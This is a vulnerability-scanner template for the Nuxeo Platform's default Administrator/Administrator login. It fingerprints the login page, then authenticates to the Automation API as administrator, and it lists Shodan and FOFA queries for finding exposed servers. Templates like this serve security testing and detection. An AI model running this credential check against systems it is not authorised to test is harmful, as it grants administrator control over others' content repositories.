id: nuxeo-default-login

info:
  name: Nuxeo Platform - Default Login
  author: s4e-io
  severity: high
  description: |
    Nuxeo Platform contains a default login caused by the built-in Administrator account shipping with the password Administrator and no forced change on first login, letting remote attackers authenticate to the Automation API as an administrator and control the whole content repository.
  reference:
    - https://doc.nuxeo.com/rest-api/1/automation-endpoint/
    - https://hub.docker.com/_/nuxeo
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    verified: true
    max-request: 2
    vendor: nuxeo
    product: nuxeo
    shodan-query: http.html:"Nuxeo Platform"
    fofa-query: body="Nuxeo Platform" || title="Nuxeo Platform"
  tags: nuxeo,default-login

variables:
  username: "Administrator"
  password: "Administrator"

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /nuxeo/login.jsp HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    max-redirects: 2

    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'contains_all(body, "Nuxeo Platform", "alt=\"Nuxeo\"")'
          - 'status_code == 200'
        condition: and

  - raw:
      - |
        POST /nuxeo/site/automation/login HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}

    host-redirects: true
    max-redirects: 2

    matchers:
      - type: dsl
        dsl:
          - 'regex("\"entity-type\"\\s*:\\s*\"login\"", body)'
          - 'regex("\"isAdministrator\"\\s*:\\s*true", body)'
          - 'regex("\"username\"\\s*:\\s*\"Administrator\"", body)'
          - 'contains(content_type, "json")'
          - 'status_code == 200'
        condition: and
